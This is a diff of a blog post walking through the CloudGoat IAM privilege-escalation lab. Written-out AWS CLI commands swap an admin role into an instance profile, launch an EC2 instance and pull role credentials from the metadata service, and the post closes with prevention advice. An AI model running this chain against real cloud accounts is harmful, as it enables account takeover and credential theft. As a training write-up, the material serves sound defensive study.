@@ -55,7 +55,7 @@
                         <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/jq_fun.png" alt="jq_fun" class="img-fluid">
                         <p>Lets see what else our permissions can do. We'll start with the instance profiles command. According to Pacu we have rights to invoke this command.</p>
                         <pre><code>aws iam list-instance-profiles |jq</code></pre>
-                        <p>Looking at the output below we see a profile with the 'cg-ec2-meek-role' associated with it. The profile has a policy that allows for 'sts:AssumeRole'.</p>
+                        <p>Looking at the output below we see a profile with the 'cg-ec2-meek-role' associated with it.</p>
                         <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/iam_list_profiles.png" data-toggle="modal" data-target="#list_profiles" alt="iam_list_profiles" class="img-fluid">
                         <p>Lets use pacu to see what instances,security groups, vpcs, and subnets exist within the environment:</p>
                         <pre><code>run ec2__enum --region=us-east-1</code></pre>
@@ -67,46 +67,175 @@
                         <p>And we can see that there is an ec2 and one of the tags is that it is a ’super critical server'</p>
                         <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/super_critical_tag.png" alt="critical_ec2_enum" class="img-fluid">
                         <hr>
-                        <h5 id="hard-part">The hard part</h5>
+                        <h3 id="more_enumeration">More Enumeration</h3>
                         <p>Considering everything that we've seen up to this point:</p>
                         <ul>
                             <li>A critical instance exists</li>
                             <li>We can perform several ec2 tasks</li>
-                            <li>We don't seem to have any other permissions</li>
                             <li>We do have some limited iam rights</li>
-                            <li>There is a ec2 profile that can assume roles</li>
                         </ul>
-                        <p>There seems to be some potential for us to create an instance to leverage the assume role policy. Lets use Pacu to see if we have any additional iam permissions that could be of use.</p>
+                        <p>There seems to be some potential for us to create an instance. Lets use Pacu to see if we have any additional iam permissions that could be of use.</p>
+                        <pre><code>run iam__enum_users_roles_policies_groups</code></pre>
+                        <p>In the output below it looks like we do not have permissions to make the: <code>list_users, list_groups, or list_policies</code> calls. We do however have permissions to list roles within the account.</p> 
                         <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/iam_permission_failure.png" alt="iam_enum" class="img-fluid">
-
+                        <p>Lets dig into those a big more. This can be done by either running the 'data' command from within Pacu or by running the following command via the aws cli:</p>
+                        <pre><code>aws --profile kerrigan iam list-roles | jq '.Roles[].RoleName'</code></pre>
                         <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/account_iam_roles.png" alt="iam_roles" class="img-fluid">
+                        <p>Considering the role we saw associated with the ec2 instance earlier was called 'meek' its interesting to see another role with the name of 'mightly'. Lets dig into that a bit more. Instead of making another <code>iam list-roles</code> call to AWS, lets just use the existing data within Pacu by running the <code>data</code> command.</p>
                         <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/mighty_role.png" alt="mighty_role" class="img-fluid">
-                        <p>In the picture above we can see that the 'mighty' role is a role associated with the ec2 service. This is a role that can be associated with an ec2 profile, and that profile can be associated with an ec2 instance.</p>
-                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/list_policies_error.png" alt="list_policies_error" class="img-fluid">
-
-
-
-                        <h5 id="make-ec2">Make an Ec2</h5>
-                        <p>Lets create our own ec2</p>
-                        <p>First we need a key pair:</p>
-                        <pre><code>aws ec2 create-key-pair --key-name toteslegit --profile kerrigan</code></pre>
-                        <p>Now lets save that for future use and create a ec2 using that pair:</p>
-                        <pre><code>aws ec2 run-instances --image-id ami-0a313d6098716f372 --count 1 --instance-type t2.micro --security-group-ids sg-082d358f4161c877c --subnet-id subnet-0c9d7451cc4e04e01 --key-name toteslegit --tags Key=name,Value=Toteslegit --profile kerrigan</code></pre>
-                        <p>And this is successful and returns our instance id </p>
-                        <pre><code>"InstanceId": "i-0ecf2a591e0d75d18”</code></pre>
-                        <p>Now we can ssh into the box using our key</p>
-                        <pre><code>ssh -i toteslegit ubuntu@</code></pre>
-                        <p>Now we can query the meta data service</p>
+                        <p>In the picture above we can see that the 'mighty' role is a role associated with the ec2 service. This is a role that can be associated with an ec2 profile, and the profile can be associated with an ec2 instance.</p>
+                        <p>Considering we have permissions into describing instalnce profile associates, perhaps we also have the ability to associate different roles to a profile. Lets see if we can attach the mighty role to the ec2 profile</p>
+                        <p>Only one role can be associated with an ec2 instance profile at a time. To begin we will see if we can remove the existing meek role from the profile. We need to pieces of information in order to remove a role from an instance profile. The role name we want to remove, and the profile we want to remove it from. Luckily we know both of those bits of information from our enumeration.</p>
+                        <ul>
+                            <li>Role: cg-ec2-meek-role-cgidawtm15fqxm</li>
+                            <li>Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm</li>
+                        </ul>
+                        <pre><code>aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-meek-role-cgidawtm15fqxm</code></pre>
+                        <p>If the command is successful, there will be no output, if it fails, it squawks. We can confirm it as successful by running the <code>list-instance-profiles</code> command again.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/instance_profile_no_role.png" alt="no_role" class="img-fluid">
+                        <p>In the output above we see the <code>meek</code> instance profile with no roles associated with it. Great! Now lets try associating the <code>mighty</code> role with the <code>meek</code> instance profile. In order to do this we need two pieces of information, the role name, and the instance profile name.</p>
+                        <ul>
+                            <li>Role: cg-ec2-mighty-role-cgidawtm15fqxm</li>
+                            <li>Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm</li>
+                        </ul>
+                        <pre><code>aws --profile kerrigan iam add-role-to-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-mighty-role-cgidawtm15fqxm</code></pre>
+                        <p>Similar to the output when we removed the role from the profile, there will be no output if successful. However running the <code>list-isntance-profiles</code> command again we can see that the <code>mighty</code> role has been associated with the <code>meek</code> instance profile.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/meek_profile_mighty_role.png" alt="no_role" class="img-fluid">
+                        <p>Perfect! We now have the mighty role associated with the meek profile.</p>
+                        <hr />
+                        <h3 id="make_ec2">Make an ec2</h3>
+                        <p>Lets create our own ec2 and see if we can associate the meek instance profile with the now might role attached to an ec2 instance that we can gain access to. In order to create an ec2 we need several pieces of information:</p>
+                        <ul>
+                            <li>ssh key</li>
+                            <li>security group ids</li>
+                            <li>subnet id</li>
+                            <li>image-id</li>
+                            <li>instance-type</li>
+                        </ul>
+                        <p>First we need a key pair the command below will create the ssh key named <code>totes-legit</code>, parses it with jq to just show the key details, and then sends the output into a file called totes-legit:</p>
+                        <pre><code>aws --profile kerrigan ec2 create-key-pair --key-name totes-legit |jq -r '.KeyMaterial' > ~/.ssh/totes-legit</code></pre>
+                        <p>Next we need to find a security group that fits our needs, or see if we can build our own. After all what use is an instane if we cannot connect to it. We can use data from Pacu or we can make another call to aws</p>
+                        <pre><code>aws --profile kerrigan ec2 describe-security-groups</code></pre>
+                        <p>Looking at the output we can see that there is already a group that fits our needs, it allows SSH from an IP address that we have access to.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/ssh_security_group.png" alt="security_group" class="img-fluid">
+                        <p>We know that the super critical server has a public IP address, we also have the subnet for that instance. We can use that subnet-id when we create our new instance.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/ec2_subnet.png" alt="ec2_subnet" class="img-fluid">
+                        <p>At this point We have all of the pieces that we need to create an instance that we will have access to (hopefully).</p>
+                        <ul>
+                            <li>ssh key: totes-legit</li>
+                            <li>security group ids: sg-0594794cf09e47456</li>
+                            <li>subnet id: subnet-0157cfe78e8beca7a</li>
+                            <li>image-id: ami-0a313d6098716f372</li>
+                            <li>instance-type: t2.micro</li>
+                        </ul>
+                        <p>Time to create an instance:</p>
+                        <pre><code>aws --profile kerrigan ec2 run-instances --image-id=ami-0a313d6098716f372 --count=1 --instance-type=t2.micro --security-group-ids=subnet-01a29bf90aca8c8d9 --subnet-id=subnet-0157cfe78e8beca7a --key-name=totes-legit --tags Key=Name,Value=totes-legit</code></pre>
+                        <p>When this is successful all of the data bout our instance is returned. This includes our instance id, ip information, and current state. and returns our instance id.</p>
+                        <pre><code>"InstanceId": "i-06f3f5f9f8cdc9c6e"</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/instance_provisioning.png" alt="ec2_provision" class="img-fluid">
+                        <p>Unfortunatly, we don't seem to have a public IP address for our instance. Did something go wrong? Nope, the current stat of the instance was 'pending'. We need to check back in on the instance an wait for the state to change to 'running'. Once its running, we should also have public IP address information. We can do this with the <code>describe-instances</code> command.</p>
+                        <pre><code>aws --profile kerrigan ec2 describe-instances --instance-id=i-06f3f5f9f8cdc9c6e</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/ec2_running.png" alt="ec2_running" class="img-fluid">
+                        <p>The output from the command in the picture above shows that the instance is 'running' and that we have a public IP.</p>
+                        <pre><code>"PublicIpAddress": "18.232.65.212"</code></pre>
+                        <p>Now we can ssh into the box using our totes-legit key:</p>
+                        <pre><code>ssh -i ~/.ssh/totes-legit ubuntu@18.232.65.212</code></pre>
+                        <p>Now we can query the meta data service and extract the instance keys, or we could run commands directly through this ec2. Lets grab the keys.</p>
                         <pre><code>curl http://169.254.169.254/latest/meta-data/iam/</code></pre>
-                        <p>Weird no access keys like last time….ah right no roles have been assigned yet</p>
-                        <p>So lets assign a profile</p>
-                        <pre><code>aws ec2 associate-iam-instance-profile --instance-id i-0ecf2a591e0d75d18 --iam-instance-profile Name=cg-ec2-meek-instance-profile-cgid17lgq8xa81  --profile kerrigan</code></pre>
-                        <p>And now lets ssh in</p>
-
-
-                        <!-- <img src="../static/images/Office365/flow/email_flow.png" alt="Email Flow" class="img-fluid"> -->
-
-
+                        <p>Weird, looking at the output below we get a 404 error and no access keys. What could cause that?</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/404_iam.png" alt="404_iam" class="img-fluid">
+                        <hr />
+                        <h3 id="more_power">More Power</h3>
+                        <p>Looking back at what we've done.</p>
+                        <ul>
+                            <li>We found an instance profile</li>
+                            <li>We disassociated a role with the instance profile</li>
+                            <li>We associated a new role with the instance profile</li>
+                            <li>We created an ec2 instance that we have access to.</li>
+                        </ul>
+                        <p>Something we have not done yet, associate an instance profile with our instance. This profile is how our instance gains privileges. Remeber, an ec2 can have an instance profile associated with it. That profile can have 1 role associated with it, and that role can have policies attached to it.</p>
+                        <p>Lets assign a profile to our instance. We'll need our <code>instance Id</code>, and the <code>meek-instance</code> profile name we discovered earlier.</p>
+                        <pre><code>aws --profile kerrigan ec2 associate-iam-instance-profile --instance-id=i-06f3f5f9f8cdc9c6e --iam-instance-profile Name=cg-ec2-meek-instance-profile-cgidawtm15fqxm</code></pre>
+                        <p>Once the command is executed we'll see an output similar to the one below with a state of 'associating'</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/associate_profile.png" alt="associate_profile" class="img-fluid">
+                        <p>After a minute or two we can check back in on our instsance and attempt to curl for credentials again:</p>
+                        <pre><code>curl http://169.254.169.254/latest/meta-data/iam/</code></pre>
+                        <p>The output has changed, from a 404 error to the one below.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/curl_iam.png" alt="curl_iam" class="img-fluid">
+                        <p>Digging deeper into the meta data we can find an AccessKey, SecretAcessKey, and a Token needed to access the aws api</p>
+                        <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-cgidawtm15fqxm</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/access_key.png" alt="access_key" class="img-fluid">
+                        <p>We have a few options at this point:</p>
+                        <ul>
+                            <li>Take the access key information and run aws cli commands from our workstation</li>
+                            <li>Install/use the aws cli on the instance we control to run commands</li>
+                            <li>Use the pacu proxy</li>
+                        </ul>
+                        <p>Each of these has there own benefits and draw backs. If we steal the keys and use them locally, we run the risk of triggering Guard Duty. We could spin up an ec2 in our own account to prevent Guard Duty from alerting, but thats not necessary for this walkthrough. If we install the aws cli and issue commands we run the risk of losing access to the box. The same issue presents itself if we use the Pacu proxy.</p>
+                        <p>We'll go ahead and run the risk of losing access, and install the aws cli on our instance.</p>
+                        <p>Once its install we can validate that we have working credentials:</p>
+                        <pre><code>sts get-caller-identity</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/ec2_whoami.png" alt="ec2_whoami" class="img-fluid">
+                        <p>Perfect we have no pivoted from the <code>kerrigan</code> user to whatever permissions we have through the new <code>mighty</code> role. We should use our new abilities to see if we can determien the full extent of the mighty role.</p>
+                        <pre><code>aws iam list-attached-role-policies --role-name=cg-ec2-mighty-role-cgidawtm15fqxm</code></pre>
+                        <p>and thankfully, it looks like we have some measure of IAM privileges because the output from that command shows us the policy associated with the role:</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/mighty_policies.png" alt="mighty_polices" class="img-fluid">
+                        <p>Perhaps we have the ability to also see the configuration of that policy. Fist we'll pull in some general information about the policy:</p>
+                        <pre><code>aws iam get-policy --policy-arn=arn:aws:iam:::policy/cg-ec2-mighty-policy</code></pre>  
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/policy_version.png" alt="policy_version" class="img-fluid">                      
+                        <p>Looking at the output above we are currently using policy version v1.</p>
+                        <p>We can now get the configuration of the policy with:</p>
+                        <pre><code>aws iam get-policy-version --policy-arn=arn:aws:iam:::policy/cg-ec2-mighty-policy --version-id=v1</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/policy.png" alt="policy" class="img-fluid"> 
+                        <p>The output shows that we can take any action <code>Action: *</code> and we can access any resource <code>Resource: *</code>. Through this ec2 instance with the mighty role we are effectivly and administrator within this account. We can do anything that we would like.</p>
+                        <h3 id="prevention">Prevention</h3>
+                        <p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p>
+                        <ol>
+                            <li>The first and probably the biggest is does the Kerrigan user need a static key? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid. In this scenario specifically if we did not have the Kerrigan access key then this attack would have failed right out of gate.</li>
+                            <li>Does Kerrigan need this level of access? Looking at the policy:
+                                <pre><code>{<br>
+                                    &emsp;"Version": "2012-10-17",<br />
+                                    &emsp;"Statement": [<br />
+                                    &emsp;&emsp;{<br />
+                                        &emsp;&emsp;&emsp;"Sid": "VisualEditor0",<br />
+                                        &emsp;&emsp;&emsp;"Effect": "Allow",<br />
+                                        &emsp;&emsp;&emsp;"Action": [<br />
+                                        &emsp;&emsp;&emsp;&emsp;"iam:ListRoles",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"iam:PassRole",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"iam:ListInstanceProfiles",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"iam:AddRoleToInstanceProfile",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"iam:RemoveRoleFromInstanceProfile",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"ec2:AssociateIamInstanceProfile",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"ec2:DescribeIamInstanceProfileAssociations",<br />
+                                        &emsp;&emsp;&emsp;&emsp;"ec2:RunInstances"<br />
+                                        &emsp;&emsp;&emsp;],<br />
+                                        &emsp;&emsp;&emsp;"Resource": "*"<br />
+                                        &emsp;&emsp;},<br />
+                                        &emsp;&emsp;{<br />
+                                            &emsp;&emsp;&emsp;"Sid": "VisualEditor1",<br />
+                                            &emsp;&emsp;&emsp;"Effect": "Allow",<br />
+                                            &emsp;&emsp;&emsp;"Action": "ec2:CreateKeyPair",<br />
+                                            &emsp;&emsp;&emsp;"Resource": "*"<br />
+                                            &emsp;&emsp;},<br />
+                                            &emsp;&emsp;{<br />
+                                                &emsp;&emsp;&emsp;"Action": [<br />
+                                                &emsp;&emsp;&emsp;&emsp;"ec2:DescribeInstances","ec2:DescribeVpcs", "ec2:DescribeSubnets",<br />
+                                                &emsp;&emsp;&emsp;&emsp;"ec2:DescribeSecurityGroups"<br />
+                                                &emsp;&emsp;&emsp;],<br />
+                                                &emsp;&emsp;"Effect": "Allow",<br />
+                                                &emsp;&emsp;"Resource": "*"<br />
+                                                &emsp;&emsp;}<br />
+                                                &emsp;&emsp;]<br />
+                                }</code></pre>
+                                <p>This policy grants a lot of access, and a lot of it probably isnt necessary. The iam permissions could probably go away. But, perhaps they're needed for an automation. What if the kerrigan keys are designed to spin up Ec2 instances, each has there own unique ssh key, and each need to have the same Instance profile associated with it so that it can access S3. If thats the case some of these permissions make sense. But we could still remove <code>ListRoles, PassRole, ListInstanceProfiles, RemoveRoleFromInstanceProfile, DescribeiamInstanceProfileAssociations</code>. These permissions were critical for us to be able to pivot from Kerrigan to an instance with mighty permissions.</p>
+                            </li>
+                            <li>
+                                The mighty role should probably just not exist at all. This would be an interesting discussion with the stakeholders to understand the purpose of this role. Perhaps there is a valid reason for it, but more than likely this could have permissions scoped in and not given full administrative rights to the account.
+                            </li>
+                            <li>
+                                Proper detections could also help. While they might not prevent the entire attack, they may help to slow everything down. If the Cloudtrail logs were baselined, and examined our activities would probably stick out. Our enumeration was very loud, we made hundereds of calls over a short period of time. Additionally we probably made calls that the Kerrigan never makes. This would allow a SOC to have a heads up of the malicious activity and begin investigating. 
+                            </li>
+                        </ol>
                     </div><!-- /.blog-post -->
                 </div><!-- /.blog-main -->
 
@@ -118,30 +247,13 @@
                         <ul class="nav post-sidenav"> 
                             <li class=""> <a href="#whoami">whoami</a> </li>
                             <li class=""> <a href="#what-can-i-do">What can I do?</a></li>
-                            <li class=""> <a href="#persistence">Persistence</a> </li>
-                            <li class=""> <a href="#make-ec2">Make an Ec2</a></li>
-                            <li class=""> <a href="#security_controls">Security Controls</a>
-                                <ul class="nav"> 
-                                    <li class=""><a href="#control-dlp">Data Loss Prevention</a> </li>
-                                    <li class=""><a href="#control-log">Logging</a> </li> 
-                                    <li class=""><a href="#contorl-event-types">Event Types</a> </li>  
-                                    <li class=""><a href="#contorl-event-details">Event Details</a> </li> 
-                                    <li class=""><a href="#contorl-flow-details">Flow Details</a> </li>
-                                    <li class=""><a href="#contorl-quotas">Quotas</a> </li>
-                                </ul>  
-                            </li>
-                            <li class=""> <a href="#fun_nuances">Fun Nuances</a> 
-                                <ul class="nav"> 
-                                    <li class=""><a href="#fun-import">Import Pre-Built Flows</a> </li>
-                                    <li class=""><a href="#fun-disabled">Disabled Accounts</a> </li>
-                                    <li class=""><a href="#fun-special">Special Connectors</a> </li>
-                                    <li class=""><a href="#fun-failure">Flow Failures</a> </li>
-                                </ul>  
-                            </li>
+                            <li class=""> <a href="#more_enumeration">More Enumeration</a> </li>
+                            <li class=""> <a href="#make_ec2">Make an ec2</a></li>
+                            <li class=""> <a href="#more_power">More Power</a></li>
+                            <li class=""> <a href="#prevention">Prevention</a></li>
                             <li class=""> <a href="#top">Top</a> </li>
                     </nav>
                 </div><!-- /.blog-sidebar -->
-
             </div><!-- /.row -->
         </div> <!--/.container-->
     </div> <!--/.wrapper -->
